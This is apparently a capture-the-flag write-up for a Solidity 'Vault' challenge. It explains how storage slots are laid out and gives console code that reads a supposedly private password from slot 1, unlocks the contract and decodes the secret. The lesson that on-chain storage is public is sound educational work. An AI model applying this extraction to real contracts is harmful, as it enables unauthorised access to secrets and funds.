### Analysis
Since locked is declared first, it takes the first storage slot 0. Slots are 32 bytes large, so if the next variable can fit in the same slot "next to" locked, then Solidity will save some storage by packing both the variables in the same slot. Since password takes up a full 32-byte slot, it gets its own slot in the next available location (1).

### The Exploit
we can run the code in Developer Tools:
~~~
password = await web3.eth.getStorageAt(contract.address, 1)
await contract.unlock(password)
~~~
tips: let's decode the value:
```
const arr = password.substring(2).match(/.{2}/g).map(v => parseInt(v, 16));
new TextDecoder().decode(new Uint8Array(arr));
> 'A very strong secret password :)'
```